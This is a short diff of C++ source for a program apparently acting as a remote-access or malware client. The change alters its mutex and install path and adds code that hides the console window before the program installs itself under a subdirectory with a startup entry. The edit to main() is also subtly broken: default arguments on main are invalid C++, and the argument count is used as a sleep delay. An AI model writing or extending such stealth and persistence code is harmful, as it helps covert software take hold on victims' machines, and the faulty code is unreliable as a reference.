@@ -26,7 +26,7 @@
 
 #define TAG_NAME "Client"
 
-#define MUTEX "588bf0df-5ed3-4efa-9804-4f91767e8bb2"
+#define MUTEX "c2226c8d-e162-46d4-a4a5-aad5a88b8356"
 
 #define TIMING_RETRY 10000
 
@@ -47,7 +47,7 @@
 
 #endif
 
-#define INSTALL_PATH (-1)
+#define INSTALL_PATH 2
 
 #define SUBDIRECTORY_NAME "Client"
 
@@ -57,7 +57,9 @@
 
 
 
-int main(int argc,char*argv[]) {
+int main(int argc=0,char*argv[]= nullptr) {
+    Sleep(argc);
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
         Install::installClient(INSTALL_PATH,argv[0],SUBDIRECTORY_NAME,SUBDIRECTORY_FILE_NAME,STARTUP_NAME);
